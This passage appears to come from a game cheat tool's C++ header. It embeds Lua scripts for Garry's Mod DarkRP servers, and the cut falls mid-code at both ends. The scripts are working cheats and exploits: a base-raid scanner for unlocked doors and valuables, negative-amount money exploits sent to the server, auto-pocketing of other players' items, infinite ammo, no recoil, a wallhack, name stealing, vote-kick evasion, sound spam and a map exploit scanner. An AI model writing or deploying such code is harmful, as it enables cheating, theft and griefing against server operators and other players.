                owner = e:getDoorOwner():Nick()
            end
        end)

        local locked = "?"
        pcall(function()
            if e.IsLocked then
                local s, v = pcall(e.IsLocked, e)
                if s then locked = v and "LOCKED" or "OPEN" end
            end
        end)

        local hasFading = false
        pcall(function()
            if e.isFadingDoor then hasFading = e:isFadingDoor() end
        end)

        local pos = e:GetPos()
        table.insert(doorData, {
            idx = e:EntIndex(), owner = owner, locked = locked,
            fading = hasFading, pos = pos, dist = pos:Distance(myPos)
        })

        -- Group by owner for base detection
        if owner ~= "unowned" then
            bases[owner] = bases[owner] or {doors = {}, entities = {}}
            table.insert(bases[owner].doors, {
                idx = e:EntIndex(), locked = locked, fading = hasFading,
                pos = pos, dist = pos:Distance(myPos)
            })
        end
    end

    -- Scan for keypads near doors
    local keypads = {}
    for _, e in ipairs(ents.FindInSphere(myPos, 2000)) do
        if not IsValid(e) then continue end
        local cls = string.lower(e:GetClass() or "")
        if string.find(cls, "keypad") then
            table.insert(keypads, {pos = e:GetPos(), idx = e:EntIndex()})
        end
    end

    -- Scan for valuables inside bases
    for _, e in ipairs(ents.FindInSphere(myPos, 2000)) do
        if not IsValid(e) then continue end
        local cls = string.lower(e:GetClass() or "")
        local isValuable = string.find(cls, "printer") or string.find(cls, "shipment")
            or string.find(cls, "drug") or string.find(cls, "bitcoin")
        if not isValuable then continue end

        local owner = "unknown"
        pcall(function()
            if e.Getowning_ent and IsValid(e:Getowning_ent()) then
                owner = e:Getowning_ent():Nick()
            end
        end)

        if bases[owner] then
            table.insert(bases[owner].entities, {
                cls = cls, pos = e:GetPos()
            })
        end
    end

    r = "=== RAID INTELLIGENCE REPORT ===\n\n"

    -- Sort bases by value (number of entities)
    local sorted = {}
    for owner, data in pairs(bases) do
        table.insert(sorted, {owner = owner, data = data})
    end
    table.sort(sorted, function(a, b) return #a.data.entities > #b.data.entities end)

    for _, base in ipairs(sorted) do
        local owner = base.owner
        local data = base.data
        r = r .. "BASE: " .. owner .. "\n"
        r = r .. "  Doors: " .. #data.doors .. "\n"
        for _, d in ipairs(data.doors) do
            local fading = d.fading and " [FADING]" or ""
            r = r .. "    #" .. d.idx .. " " .. d.locked .. fading
                .. " (" .. math.floor(d.dist) .. "u)\n"
        end
        if #data.entities > 0 then
            r = r .. "  Valuables: " .. #data.entities .. "\n"
            for _, e in ipairs(data.entities) do
                r = r .. "    " .. e.cls .. "\n"
            end
        end
        -- Find nearest keypad to this base's doors
        for _, d in ipairs(data.doors) do
            for _, k in ipairs(keypads) do
                if k.pos:Distance(d.pos) < 150 then
                    r = r .. "  Keypad #" .. k.idx .. " near door #" .. d.idx .. "\n"
                end
            end
        end
        r = r .. "\n"
    end

    -- Vulnerability assessment
    r = r .. "=== WEAK POINTS ===\n"
    for _, base in ipairs(sorted) do
        local unlocked = 0
        local fading = 0
        for _, d in ipairs(base.data.doors) do
            if d.locked == "OPEN" then unlocked = unlocked + 1 end
            if d.fading then fading = fading + 1 end
        end
        if unlocked > 0 then
            r = r .. base.owner .. ": " .. unlocked .. " UNLOCKED doors!\n"
        end
        if fading > 0 then
            r = r .. base.owner .. ": " .. fading .. " fading doors (exploitable)\n"
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 104. Economy Destroyer -- buy/sell arbitrage + money vacuum + wealth intel
	// -----------------------------------------------------------------------
	inline const char* LUA_ECONOMY_DESTROY = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    local myPos = lp:GetPos()

    -- Phase 1: Vacuum all ground money (staggered to dodge rate limits)
    local groundMoney = {}
    for _, e in ipairs(ents.GetAll()) do
        if not IsValid(e) then continue end
        local cls = (e:GetClass() or ""):lower()
        if cls:find("money") or cls:find("dollar") or cls:find("cash") then
            local amt = 0
            pcall(function()
                if e.GetAmount then amt = e:GetAmount()
                elseif e.Getamount then amt = e:Getamount()
                elseif e.GetMoney then amt = e:GetMoney()
                elseif e:GetNWInt("amount",0) > 0 then amt = e:GetNWInt("amount",0) end
            end)
            table.insert(groundMoney, {ent = e, amount = amt, dist = e:GetPos():Distance(myPos)})
        end
    end
    table.sort(groundMoney, function(a, b) return a.dist < b.dist end)
    local vacuumed = 0
    local vacuumTotal = 0
    for i, m in ipairs(groundMoney) do
        if m.dist < 500 then
            timer.Simple((i-1) * 0.03, function()
                if not IsValid(m.ent) then return end
                pcall(function() RunConsoleCommand("darkrp", "pocket", m.ent:EntIndex()) end)
                pcall(function() lp:PickupObject(m.ent) end)
            end)
            vacuumed = vacuumed + 1
            vacuumTotal = vacuumTotal + m.amount
        end
    end

    -- Phase 2: Buy/sell arbitrage scanner
    local arbitrage = {}
    if DarkRPEntities then
        for _, item in pairs(DarkRPEntities) do
            pcall(function()
                local buyPrice = item.price or 0
                local sellPrice = 0
                if item.getPrice then sellPrice = item:getPrice() end
                local name = item.name or item.ent or "unknown"
                if sellPrice > buyPrice and buyPrice > 0 then
                    table.insert(arbitrage, {name = name, buy = buyPrice, sell = sellPrice, profit = sellPrice - buyPrice})
                end
            end)
        end
    end
    table.sort(arbitrage, function(a, b) return a.profit > b.profit end)

    -- Phase 3: Attempt negative amount exploits
    local negResults = {}
    local negMsgs = {"DarkRP_MoneyRequest","DarkRP_GiveMoney","moneyRequest","darkrp_money","DarkRP_TransferMoney"}
    for _, msg in ipairs(negMsgs) do
        pcall(function()
            net.Start(msg)
            net.WriteInt(-999999, 32)
            net.SendToServer()
            table.insert(negResults, msg .. " (negative)")
        end)
    end
    pcall(function() RunConsoleCommand("darkrp", "give", "-50000") end)
    pcall(function() RunConsoleCommand("darkrp", "dropmoney", "-50000") end)

    -- Phase 4: Attempt shipment buy with 0 or negative cost
    pcall(function()
        if CustomShipments then
            for id, ship in pairs(CustomShipments) do
                if ship.price and ship.price > 0 then
                    pcall(function()
                        net.Start("DarkRP_spawnShipment")
                        net.WriteFloat(id)
                        net.WriteBool(false)
                        net.SendToServer()
                    end)
                    break
                end
            end
        end
    end)

    -- Phase 5: Full wealth intelligence
    local economy = {}
    local totalWealth = 0
    for _, ply in ipairs(player.GetAll()) do
        if not IsValid(ply) then continue end
        local money = 0
        local salary = 0
        pcall(function() money = ply:getDarkRPVar("money") or 0 end)
        pcall(function() salary = ply:getDarkRPVar("salary") or 0 end)
        totalWealth = totalWealth + money
        table.insert(economy, {name = ply:Nick(), money = money, salary = salary, job = team.GetName(ply:Team())})
    end
    table.sort(economy, function(a, b) return a.money > b.money end)

    r = "=== ECONOMY EXPLOIT ===\n"
    r = r .. "Money vacuumed: " .. vacuumed .. " entities ($" .. vacuumTotal .. ")\n"
    r = r .. "Negative-amount msgs sent: " .. #negResults .. "\n"
    if #arbitrage > 0 then
        r = r .. "\nARBITRAGE OPPORTUNITIES:\n"
        for i = 1, math.min(5, #arbitrage) do
            local a = arbitrage[i]
            r = r .. "  " .. a.name .. ": buy $" .. a.buy .. " sell $" .. a.sell .. " (profit $" .. a.profit .. ")\n"
        end
    end
    r = r .. "\nSERVER WEALTH: $" .. totalWealth .. "\n"
    for i, e in ipairs(economy) do
        r = r .. i .. ". " .. e.name .. " [" .. e.job .. "] $" .. e.money .. " (sal: $" .. e.salary .. ")\n"
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 105. Player Puppet -- record and replay movement patterns
	// -----------------------------------------------------------------------
	inline const char* LUA_PUPPET_RECORD_SETUP = R"lua(
pcall(function()
    if _fdll_puppet_recording then return end
    _fdll_puppet_recording = true
    _fdll_puppet_data = {}
    _fdll_puppet_target = nil

    -- Find nearest player to crosshair
    local lp = LocalPlayer()
    local eyePos = lp:EyePos()
    local eyeDir = lp:GetAimVector()
    local bestDot = -1
    local bestPly = nil

    for _, ply in ipairs(player.GetAll()) do
        if ply == lp or not IsValid(ply) or not ply:Alive() then continue end
        local dir = (ply:GetPos() - eyePos):GetNormalized()
        local dot = eyeDir:Dot(dir)
        if dot > bestDot then
            bestDot = dot
            bestPly = ply
        end
    end

    if not bestPly then
        _fdll_puppet_recording = false
        return
    end

    _fdll_puppet_target = bestPly

    hook.Add("Think", "_fdll_puppet_rec", function()
        if not _fdll_puppet_recording then return end
        if not IsValid(_fdll_puppet_target) then return end
        local t = _fdll_puppet_target

        table.insert(_fdll_puppet_data, {
            pos = t:GetPos(),
            ang = t:EyeAngles(),
            vel = t:GetVelocity(),
            buttons = t:GetButtons and t:GetButtons() or 0,
            weapon = IsValid(t:GetActiveWeapon()) and t:GetActiveWeapon():GetClass() or "",
            ducking = t:Crouching(),
            t = CurTime()
        })

        if #_fdll_puppet_data > 600 then -- ~10 seconds at 60 tick
            _fdll_puppet_recording = false
            hook.Remove("Think", "_fdll_puppet_rec")
        end
    end)
end)
)lua";

	inline const char* LUA_PUPPET_RECORD_STOP = R"lua(
pcall(function()
    _fdll_puppet_recording = false
    hook.Remove("Think", "_fdll_puppet_rec")
end)
)lua";

	inline const char* LUA_PUPPET_REPLAY = R"lua(
local r = ""
pcall(function()
    if not _fdll_puppet_data or #_fdll_puppet_data == 0 then
        r = "No puppet data recorded.\n"
        return
    end

    if _fdll_puppet_replaying then
        r = "Already replaying.\n"
        return
    end

    _fdll_puppet_replaying = true
    _fdll_puppet_replay_idx = 1
    local startTime = CurTime()

    hook.Add("CreateMove", "_fdll_puppet_play", function(cmd)
        if not _fdll_puppet_replaying then return end
        local idx = _fdll_puppet_replay_idx
        if idx > #_fdll_puppet_data then
            _fdll_puppet_replaying = false
            hook.Remove("CreateMove", "_fdll_puppet_play")
            return
        end

        local frame = _fdll_puppet_data[idx]
        local lp = LocalPlayer()
        if not IsValid(lp) then return end

        -- Replay movement
        local targetPos = frame.pos
        local myPos = lp:GetPos()
        local moveDir = targetPos - myPos
        local dist = moveDir:Length2D()

        if dist > 5 then
            local ang = moveDir:Angle()
            local diff = math.NormalizeAngle(ang.y - cmd.viewangles.y)
            local rad = math.rad(diff)
            cmd.forwardmove = math.cos(rad) * math.min(dist * 10, 10000)
            cmd.sidemove = -math.sin(rad) * math.min(dist * 10, 10000)
        end

        if frame.ducking then
            cmd.buttons = bit.bor(cmd.buttons, IN_DUCK)
        end

        _fdll_puppet_replay_idx = idx + 1
    end)

    r = "Replaying " .. #_fdll_puppet_data .. " frames from " .. (_fdll_puppet_target and _fdll_puppet_target:Nick() or "unknown") .. "\n"
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 106. Infinite Ammo via clientside prediction abuse
	// -----------------------------------------------------------------------
	inline const char* LUA_INFINITE_AMMO_SETUP = R"lua(
pcall(function()
    if _fdll_infammo_active then return end
    _fdll_infammo_active = true

    hook.Add("Think", "_fdll_infammo", function()
        if not _fdll_infammo_active then return end
        local lp = LocalPlayer()
        if not IsValid(lp) or not lp:Alive() then return end
        local wep = lp:GetActiveWeapon()
        if not IsValid(wep) then return end

        -- Restore clip to max each frame (prediction abuse)
        local maxClip = wep:GetMaxClip1()
        if maxClip > 0 and wep:Clip1() < maxClip then
            wep:SetClip1(maxClip)
        end
        local maxClip2 = wep:GetMaxClip2()
        if maxClip2 > 0 and wep:Clip2() < maxClip2 then
            wep:SetClip2(maxClip2)
        end

        -- Also refill reserve ammo
        local primaryType = wep:GetPrimaryAmmoType()
        if primaryType >= 0 then
            local curAmmo = lp:GetAmmoCount(primaryType)
            if curAmmo < 999 then
                lp:SetAmmo(999, primaryType)
            end
        end
    end)
end)
)lua";

	inline const char* LUA_INFINITE_AMMO_STOP = R"lua(
pcall(function()
    _fdll_infammo_active = false
    hook.Remove("Think", "_fdll_infammo")
end)
)lua";

	// -----------------------------------------------------------------------
	// 107. No Recoil + No Spread via Lua prediction
	// -----------------------------------------------------------------------
	inline const char* LUA_NO_RECOIL_SETUP = R"lua(
pcall(function()
    if _fdll_norecoil_active then return end
    _fdll_norecoil_active = true

    hook.Add("CreateMove", "_fdll_norecoil", function(cmd)
        local lp = LocalPlayer()
        if not IsValid(lp) then return end
        local punch = lp:GetViewPunchAngles()
        if punch then
            cmd.viewangles.p = cmd.viewangles.p - punch.p * 2
            cmd.viewangles.y = cmd.viewangles.y - punch.y * 2
        end
    end)

    -- Override spread calculation
    hook.Add("EntityFireBullets", "_fdll_nospread", function(ent, data)
        if ent == LocalPlayer() then
            data.Spread = Vector(0, 0, 0)
            data.Num = data.Num or 1
            return true
        end
    end)
end)
)lua";

	inline const char* LUA_NO_RECOIL_STOP = R"lua(
pcall(function()
    _fdll_norecoil_active = false
    hook.Remove("CreateMove", "_fdll_norecoil")
    hook.Remove("EntityFireBullets", "_fdll_nospread")
end)
)lua";

	// -----------------------------------------------------------------------
	// 108. Spawn Entity Exploiter -- spawn custom entities
	// -----------------------------------------------------------------------
	inline const char* LUA_SPAWN_EXPLOITER = R"lua(
local r = ""
pcall(function()
    -- Discover all spawnable entity classes
    local spawnables = {}
    local allEnts = scripted_ents.GetList()
    if allEnts then
        for name, data in pairs(allEnts) do
            if data.Spawnable then
                local category = data.Category or "Uncategorized"
                local adminOnly = data.AdminOnly or false
                table.insert(spawnables, {
                    name = name, cat = category, admin = adminOnly
                })
            end
        end
    end

    -- Try to spawn via console commands that bypass restrictions
    local spawnCmds = {}
    local cmdTable = concommand.GetTable()
    for name, _ in pairs(cmdTable) do
        if string.find(name, "spawn") or string.find(name, "give") or string.find(name, "create") then
            table.insert(spawnCmds, name)
        end
    end

    table.sort(spawnables, function(a, b) return a.name < b.name end)
    table.sort(spawnCmds)

    r = "=== SPAWNABLE ENTITIES ===\n"
    r = r .. "Total: " .. #spawnables .. "\n\n"
    for _, e in ipairs(spawnables) do
        local flag = e.admin and " [ADMIN]" or ""
        r = r .. e.name .. " (" .. e.cat .. ")" .. flag .. "\n"
    end

    r = r .. "\n=== SPAWN COMMANDS ===\n"
    for _, c in ipairs(spawnCmds) do
        r = r .. c .. "\n"
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 109. Auto-Pocket Everything -- smart pocket with priority targeting + stagger
	// -----------------------------------------------------------------------
	inline const char* LUA_AUTO_POCKET = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) or not lp:Alive() then r = "Not alive" return end

    local myPos = lp:GetPos()
    local radius = 300
    local skip = {["worldspawn"]=1,["func_door"]=1,["player"]=1,["env_"]=1,["info_"]=1,["logic_"]=1,["trigger_"]=1}

    local function getPriority(cls)
        if cls:find("printer") or cls:find("bitminers") then return 1 end
        if cls:find("shipment") then return 2 end
        if cls:find("money") or cls:find("dollar") or cls:find("cash") then return 3 end
        if cls:find("weapon_") then return 4 end
        if cls:find("drug") or cls:find("weed") or cls:find("meth") then return 5 end
        if cls:find("item_") or cls:find("food") or cls:find("armor") then return 6 end
        return 7
    end

    local function isSkipped(cls)
        for pat, _ in pairs(skip) do
            if cls == pat or cls:find(pat) then return true end
        end
        if cls:find("prop_door") or cls:find("func_") then return true end
        return false
    end

    local targets = {}
    for _, e in ipairs(ents.FindInSphere(myPos, radius)) do
        if not IsValid(e) or e:IsPlayer() then continue end
        local cls = (e:GetClass() or ""):lower()
        if isSkipped(cls) then continue end
        local dist = e:GetPos():Distance(myPos)
        table.insert(targets, {ent = e, cls = cls, dist = dist, pri = getPriority(cls)})
    end

    table.sort(targets, function(a, b)
        if a.pri ~= b.pri then return a.pri < b.pri end
        return a.dist < b.dist
    end)

    local pocketed = 0
    local walked = 0
    local maxPocket = 30
    local delay = 0

    for i, t in ipairs(targets) do
        if pocketed >= maxPocket then break end

        if t.dist <= 150 then
            timer.Simple(delay, function()
                if not IsValid(t.ent) then return end
                pcall(function()
                    RunConsoleCommand("darkrp", "pocket", tostring(t.ent:EntIndex()))
                end)
            end)
            delay = delay + 0.05
            pocketed = pocketed + 1
        elseif t.pri <= 3 and t.dist <= radius then
            timer.Simple(delay + 0.5, function()
                if not IsValid(t.ent) or not IsValid(lp) or not lp:Alive() then return end
                local dir = (t.ent:GetPos() - lp:GetPos()):GetNormalized()
                local ang = dir:Angle()
                pcall(function()
                    RunConsoleCommand("+forward")
                    lp:SetEyeAngles(ang)
                end)
                timer.Simple(0.3, function()
                    pcall(function() RunConsoleCommand("-forward") end)
                    timer.Simple(0.1, function()
                        if not IsValid(t.ent) then return end
                        pcall(function()
                            RunConsoleCommand("darkrp", "pocket", tostring(t.ent:EntIndex()))
                        end)
                    end)
                end)
            end)
            delay = delay + 1.0
            walked = walked + 1
        end
    end

    local byType = {}
    for _, t in ipairs(targets) do
        byType[t.cls] = (byType[t.cls] or 0) + 1
    end

    r = "=== SMART POCKET ===\n"
    r = r .. "Instant pocket: " .. pocketed .. " (staggered 50ms)\n"
    r = r .. "Walk-to targets: " .. walked .. " (high value only)\n"
    r = r .. "Total scanned: " .. #targets .. " in " .. radius .. "u\n\n"
    for cls, cnt in pairs(byType) do
        r = r .. "  " .. cls .. ": " .. cnt .. "\n"
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 110. Doubletap Tickbase Shift -- fire 2 shots in 1 tick
	// -----------------------------------------------------------------------
	// (This is wired in C++ via CreateMove, Lua part just controls the toggle)
	inline const char* LUA_DOUBLETAP_INFO = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    local wep = lp:GetActiveWeapon()
    if not IsValid(wep) then return end

    local fireRate = 0
    pcall(function()
        if wep.GetFireDelay then fireRate = wep:GetFireDelay() end
        if fireRate == 0 and wep.Primary then fireRate = wep.Primary.Delay or 0 end
    end)

    local tickRate = 1 / engine.TickInterval()
    local ticksPerShot = math.ceil(fireRate * tickRate)

    r = "Weapon: " .. wep:GetClass() .. "\n"
    r = r .. "Fire Rate: " .. string.format("%.3f", fireRate) .. "s\n"
    r = r .. "Tick Rate: " .. tickRate .. "\n"
    r = r .. "Ticks/Shot: " .. ticksPerShot .. "\n"
    r = r .. "DT Shift Needed: " .. ticksPerShot .. " ticks\n"
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 111. Name Stealer -- cycle through other players' names
	// -----------------------------------------------------------------------
	inline const char* LUA_NAME_STEALER_SETUP = R"lua(
pcall(function()
    if _fdll_namesteal_active then return end
    _fdll_namesteal_active = true
    _fdll_namesteal_orig = LocalPlayer():Nick()
    _fdll_namesteal_idx = 1

    timer.Create("_fdll_namesteal", 8, 0, function()
        if not _fdll_namesteal_active then return end
        local players = player.GetAll()
        local lp = LocalPlayer()
        local others = {}
        for _, p in ipairs(players) do
            if p ~= lp and IsValid(p) then table.insert(others, p) end
        end
        if #others == 0 then return end
        _fdll_namesteal_idx = (_fdll_namesteal_idx % #others) + 1
        local target = others[_fdll_namesteal_idx]
        if IsValid(target) then
            RunConsoleCommand("setinfo", "name", target:Nick())
        end
    end)
end)
)lua";

	inline const char* LUA_NAME_STEALER_STOP = R"lua(
pcall(function()
    _fdll_namesteal_active = false
    timer.Remove("_fdll_namesteal")
    if _fdll_namesteal_orig then
        RunConsoleCommand("setinfo", "name", _fdll_namesteal_orig)
    end
end)
)lua";

	// -----------------------------------------------------------------------
	// 112. Anti-Kick Shield -- auto vote no on kicks against you
	// -----------------------------------------------------------------------
	inline const char* LUA_ANTIKICK_SETUP = R"lua(
pcall(function()
    if _fdll_antikick_active then return end
    _fdll_antikick_active = true
    _fdll_antikick_log = _fdll_antikick_log or {}

    hook.Add("VoteStart", "_fdll_antikick", function(question, ...)
        local lp = LocalPlayer()
        if not IsValid(lp) then return end
        local myName = lp:Nick()
        local qLow = string.lower(question or "")
        if string.find(qLow, string.lower(myName)) or string.find(qLow, "kick") then
            -- Auto vote no
            timer.Simple(0.5, function()
                RunConsoleCommand("vote", "no")
                RunConsoleCommand("votekick_no")
                RunConsoleCommand("ulx", "vote_no")
            end)
            table.insert(_fdll_antikick_log, {t = CurTime(), q = question})
        end
    end)

    -- Also hook generic vote systems
    hook.Add("Think", "_fdll_antikick_poll", function()
        -- Continuously vote no on any active votes
        pcall(function()
            if GAMEMODE and GAMEMODE.Vote and GAMEMODE.Vote.Active then
                RunConsoleCommand("vote", "2") -- "no" option
            end
        end)
    end)
end)
)lua";

	inline const char* LUA_ANTIKICK_STOP = R"lua(
pcall(function()
    _fdll_antikick_active = false
    hook.Remove("VoteStart", "_fdll_antikick")
    hook.Remove("Think", "_fdll_antikick_poll")
end)
)lua";

	// -----------------------------------------------------------------------
	// 113. Fake Death -- play ragdoll animation while staying alive
	// -----------------------------------------------------------------------
	inline const char* LUA_FAKE_DEATH_SETUP = R"lua(
pcall(function()
    if _fdll_fakedeath_active then return end
    _fdll_fakedeath_active = true
    local lp = LocalPlayer()
    if not IsValid(lp) then return end

    -- Create a ragdoll clone
    _fdll_fakedeath_rag = ClientsideRagdoll(lp:GetModel(), RENDERGROUP_OPAQUE)
    if IsValid(_fdll_fakedeath_rag) then
        _fdll_fakedeath_rag:SetPos(lp:GetPos())
        _fdll_fakedeath_rag:SetAngles(lp:GetAngles())
        _fdll_fakedeath_rag:SetSkin(lp:GetSkin())

        -- Copy bone positions
        for i = 0, lp:GetBoneCount() - 1 do
            local bone = _fdll_fakedeath_rag:GetPhysicsObjectNum(i)
            if IsValid(bone) then
                local pos, ang = lp:GetBonePosition(i)
                if pos then
                    bone:SetPos(pos)
                    bone:SetAngles(ang or Angle(0,0,0))
                end
            end
        end
    end

    -- Suppress our own player model drawing
    hook.Add("PrePlayerDraw", "_fdll_fakedeath_hide", function(ply)
        if ply == LocalPlayer() and _fdll_fakedeath_active then
            return true -- suppress draw
        end
    end)

    -- Play death sound
    lp:EmitSound("player/death" .. math.random(1,3) .. ".wav")
end)
)lua";

	inline const char* LUA_FAKE_DEATH_STOP = R"lua(
pcall(function()
    _fdll_fakedeath_active = false
    hook.Remove("PrePlayerDraw", "_fdll_fakedeath_hide")
    if IsValid(_fdll_fakedeath_rag) then
        _fdll_fakedeath_rag:Remove()
        _fdll_fakedeath_rag = nil
    end
end)
)lua";

	// -----------------------------------------------------------------------
	// 114. Material Wallhack -- make world surfaces transparent
	// -----------------------------------------------------------------------
	inline const char* LUA_MAT_WALLHACK_SETUP = R"lua(
pcall(function()
    if _fdll_matwh_active then return end
    _fdll_matwh_active = true
    _fdll_matwh_mats = _fdll_matwh_mats or {}

    local wallMat = CreateMaterial("_fdll_wallhack_mat", "VertexLitGeneric", {
        ["$basetexture"] = "models/debug/debugwhite",
        ["$model"] = 1,
        ["$translucent"] = 1,
        ["$alpha"] = 0.15,
        ["$ignorez"] = 0,
    })

    hook.Add("PreDrawOpaqueRenderables", "_fdll_matwh", function(depth, sky)
        if sky then return end
        render.MaterialOverride(wallMat)
    end)

    hook.Add("PostDrawOpaqueRenderables", "_fdll_matwh_post", function()
        render.MaterialOverride(nil)
    end)

    -- Also make specific brush surfaces transparent
    hook.Add("PreDrawTranslucentRenderables", "_fdll_matwh_trans", function()
        render.SetBlend(0.3)
    end)

    hook.Add("PostDrawTranslucentRenderables", "_fdll_matwh_trans_post", function()
        render.SetBlend(1)
    end)
end)
)lua";

	inline const char* LUA_MAT_WALLHACK_STOP = R"lua(
pcall(function()
    _fdll_matwh_active = false
    hook.Remove("PreDrawOpaqueRenderables", "_fdll_matwh")
    hook.Remove("PostDrawOpaqueRenderables", "_fdll_matwh_post")
    hook.Remove("PreDrawTranslucentRenderables", "_fdll_matwh_trans")
    hook.Remove("PostDrawTranslucentRenderables", "_fdll_matwh_trans_post")
end)
)lua";

	// -----------------------------------------------------------------------
	// 115. Low Gravity -- client-predicted low gravity movement
	// -----------------------------------------------------------------------
	inline const char* LUA_LOW_GRAVITY_SETUP = R"lua(
pcall(function()
    if _fdll_lowgrav_active then return end
    _fdll_lowgrav_active = true

    hook.Add("Move", "_fdll_lowgrav", function(ply, mv)
        if ply ~= LocalPlayer() then return end
        local vel = mv:GetVelocity()
        if not ply:OnGround() then
            vel.z = vel.z + 400 * FrameTime()
            mv:SetVelocity(vel)
        end
    end)
end)
)lua";

	inline const char* LUA_LOW_GRAVITY_STOP = R"lua(
pcall(function()
    _fdll_lowgrav_active = false
    hook.Remove("Move", "_fdll_lowgrav")
end)
)lua";

	// -----------------------------------------------------------------------
	// 116. Prop Launcher -- spawn and punt a prop at lethal velocity
	// -----------------------------------------------------------------------
	inline const char* LUA_PROP_LAUNCHER = R"lua(
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) or not lp:Alive() then return end

    local eyePos = lp:EyePos()
    local eyeAng = lp:EyeAngles()
    local forward = eyeAng:Forward()

    -- Spawn a prop slightly in front
    local spawnPos = eyePos + forward * 80
    RunConsoleCommand("gm_spawn", "models/props_junk/watermelon01.mdl")

    -- Apply extreme force after a short delay
    timer.Simple(0.1, function()
        local nearest = nil
        local nearestDist = math.huge
        for _, e in ipairs(ents.FindInSphere(spawnPos, 100)) do
            if IsValid(e) and not e:IsPlayer() and e:GetClass() == "prop_physics" then
                local d = e:GetPos():Distance(spawnPos)
                if d < nearestDist then
                    nearestDist = d
                    nearest = e
                end
            end
        end
        if IsValid(nearest) then
            local phys = nearest:GetPhysicsObject()
            if IsValid(phys) then
                phys:ApplyForceCenter(forward * 500000)
            end
        end
    end)
end)
)lua";

	// -----------------------------------------------------------------------
	// 117. Sound Spammer -- play annoying sounds to everyone nearby
	// -----------------------------------------------------------------------
	inline const char* LUA_SOUND_SPAM_SETUP = R"lua(
pcall(function()
    if _fdll_soundspam_active then return end
    _fdll_soundspam_active = true

    local sounds = {
        "ambient/alarms/klaxon1.wav",
        "ambient/alarms/warningbell1.wav",
        "npc/stalker/breathing3.wav",
        "ambient/machines/combine_mine_deactivate1.wav",
        "physics/metal/metal_barrel_impact_hard5.wav"
    }

    timer.Create("_fdll_soundspam", 0.3, 0, function()
        if not _fdll_soundspam_active then return end
        local lp = LocalPlayer()
        if not IsValid(lp) then return end
        local snd = sounds[math.random(#sounds)]
        lp:EmitSound(snd, 100, math.random(80, 120))
    end)
end)
)lua";

	inline const char* LUA_SOUND_SPAM_STOP = R"lua(
pcall(function()
    _fdll_soundspam_active = false
    timer.Remove("_fdll_soundspam")
end)
)lua";

	// -----------------------------------------------------------------------
	// 118. Auto-Buy on Spawn -- buy weapons and armor automatically
	// -----------------------------------------------------------------------
	inline const char* LUA_AUTOBUY_SETUP = R"lua(
pcall(function()
    if _fdll_autobuy_active then return end
    _fdll_autobuy_active = true

    hook.Add("PlayerSpawn", "_fdll_autobuy", function(ply)
        if ply ~= LocalPlayer() then return end
        timer.Simple(1, function()
            if not _fdll_autobuy_active then return end
            -- Try common DarkRP buy commands
            pcall(function()
                -- Buy armor
                RunConsoleCommand("darkrp", "buyarmor")
                -- Buy common weapons via shipment/F4 commands
                local buyCmds = {"buy", "darkrp", "rp_buy", "purchase"}
                for _, cmd in ipairs(buyCmds) do
                    pcall(function() RunConsoleCommand(cmd, "weapon_pumpshotgun2") end)
                    pcall(function() RunConsoleCommand(cmd, "m9k_m4a1") end)
                    pcall(function() RunConsoleCommand(cmd, "weapon_pistol") end)
                end
            end)
        end)
    end)
end)
)lua";

	inline const char* LUA_AUTOBUY_STOP = R"lua(
pcall(function()
    _fdll_autobuy_active = false
    hook.Remove("PlayerSpawn", "_fdll_autobuy")
end)
)lua";

	// -----------------------------------------------------------------------
	// 119. Auto-Arrest Chain -- warrant + arrest + jail combo
	// -----------------------------------------------------------------------
	inline const char* LUA_AUTO_ARREST_CHAIN = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    local eyeTrace = lp:GetEyeTrace()
    if not eyeTrace or not eyeTrace.Entity then
        r = "Look at a player first."
        return
    end
    local target = eyeTrace.Entity
    if not IsValid(target) or not target:IsPlayer() then
        r = "Not looking at a player."
        return
    end

    local targetName = target:Nick()
    r = "Executing arrest chain on: " .. targetName .. "\n"

    -- Step 1: Warrant
    pcall(function()
        RunConsoleCommand("darkrp", "warrant", targetName, "Suspicious activity")
        r = r .. "1. Warrant issued\n"
    end)

    -- Step 2: Arrest (after short delay)
    timer.Simple(0.5, function()
        pcall(function()
            RunConsoleCommand("darkrp", "arrest", targetName)
        end)
    end)

    -- Step 3: Jail via wanted system
    timer.Simple(1.0, function()
        pcall(function()
            RunConsoleCommand("darkrp", "wanted", targetName, "Criminal activity")
        end)
    end)

    r = r .. "2. Arrest queued (0.5s)\n"
    r = r .. "3. Wanted queued (1.0s)\n"
    r = r .. "Chain complete for: " .. targetName
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 120. Map OOB Scanner -- find out-of-bounds areas
	// -----------------------------------------------------------------------
	inline const char* LUA_MAP_OOB_SCAN = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    local myPos = lp:GetPos()

    r = "=== MAP EXPLOIT SCAN ===\n"
    r = r .. "Map: " .. (game.GetMap() or "unknown") .. "\n\n"

    -- Find trigger_teleport entities (potential teleport exploits)
    local teleports = {}
    for _, e in ipairs(ents.FindByClass("trigger_teleport")) do
        if IsValid(e) then
            table.insert(teleports, {pos = e:GetPos(), name = e:GetName() or "unnamed"})
        end
    end
    r = r .. "Teleport triggers: " .. #teleports .. "\n"
    for _, t in ipairs(teleports) do
        r = r .. "  " .. t.name .. " at " .. tostring(t.pos) .. "\n"
    end

    -- Find func_door_rotating (exploitable doors)
    local doors = ents.FindByClass("func_door_rotating")
    r = r .. "\nRotating doors: " .. #doors .. "\n"

    -- Find clip brushes that might have gaps
    local clips = ents.FindByClass("func_brush")
    r = r .. "Func brushes: " .. #clips .. "\n"

    -- Trace downward from sky to find skybox boundaries
    local skyTrace = util.TraceLine({
        start = myPos + Vector(0, 0, 50000),
        endpos = myPos,
        mask = MASK_SOLID_BRUSHONLY
    })
    if skyTrace.Hit then
        r = r .. "\nSky ceiling: " .. math.floor(skyTrace.HitPos.z) .. " units above\n"
    end

    -- Find map boundaries by tracing in cardinal directions
    local dirs = {
